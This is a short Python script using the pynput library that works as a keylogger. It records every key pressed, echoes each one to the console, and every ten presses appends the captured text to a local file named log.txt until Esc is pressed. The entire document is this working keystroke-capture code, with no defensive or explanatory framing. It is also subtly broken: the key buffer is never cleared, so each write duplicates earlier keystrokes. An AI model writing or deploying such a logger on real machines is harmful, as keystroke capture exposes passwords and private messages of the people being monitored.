import pynput

from pynput.keyboard import Key, Listener

frequency = 10
keys = []
count = 0


def on_press(key):
    global keys, count,frequency
    keys.append(key)
    count += 1
    print("{} pressed".format(key))

    if count >= frequency:
        count = 0
        write_file(keys)


def write_file(keys):
    with open("log.txt",'a') as file:
        for key in keys:
            k = str(key).replace("'","")

            if k.find("space") > 0 :
                file.write("\n")

            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()